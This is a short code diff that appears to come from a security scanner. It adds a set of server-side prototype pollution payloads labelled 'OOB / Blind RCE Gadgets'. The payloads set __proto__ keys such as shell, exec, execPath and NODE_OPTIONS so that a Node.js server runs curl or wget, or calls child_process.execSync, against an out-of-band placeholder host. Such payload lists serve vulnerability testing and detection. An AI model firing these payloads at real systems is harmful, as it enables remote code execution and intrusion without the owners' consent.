@@ -186,6 +186,14 @@ SERVER_SIDE_PP_PAYLOADS = {
         '{"__proto__": {"verbose": true}}',
         '{"__proto__": {"logLevel": "debug"}}',
     ],
+
+    # OOB / Blind RCE Gadgets (v4.0)
+    'blind_oob': [
+        '{"__proto__": {"shell": "curl %OOB%"}}',
+        '{"__proto__": {"exec": "wget %OOB%"}}',
+        '{"__proto__": {"execPath": "curl", "argv0": "%OOB%"}}',
+        '{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": {"TEST": "console.log(require(\'child_process\').execSync(\'curl %OOB%\'))"}}}', 
+    ],
 }
 
 # ============================================================================
